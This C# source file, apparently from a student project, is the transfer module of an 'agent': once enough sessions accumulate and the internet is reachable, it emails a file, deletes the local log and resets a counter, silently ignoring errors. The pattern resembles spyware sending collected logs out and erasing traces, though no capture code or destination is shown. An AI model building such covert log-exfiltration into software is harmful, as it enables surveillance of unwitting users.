using Agente;
using Common;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace AgenteTcc
{
    public class Transferencia
    {


        private static bool QuantidadeSessoesEhValida()
        {
            if (RegistryMemore.QuantidadeSessoesAtual >= RegistryMemore.QuantidadeSessoesMaxima)
            {
                return true;
            }
            return false;
        }

        private static void EnviarArquivo()
        {
            Email email = new Email();
            email.Send();
        }

        public static void IniciarTransferencia()
        {

            if (!QuantidadeSessoesEhValida())
            {
                return;
            }


            if (!Internet.IsConnected())
            {
                return;
            }

            try
            {
                EnviarArquivo();

                new Log().Deletar();

                RegistryMemore.QuantidadeSessoesAtual = 0;
            }
            catch
            {
                return;
            }

        }

    }
}
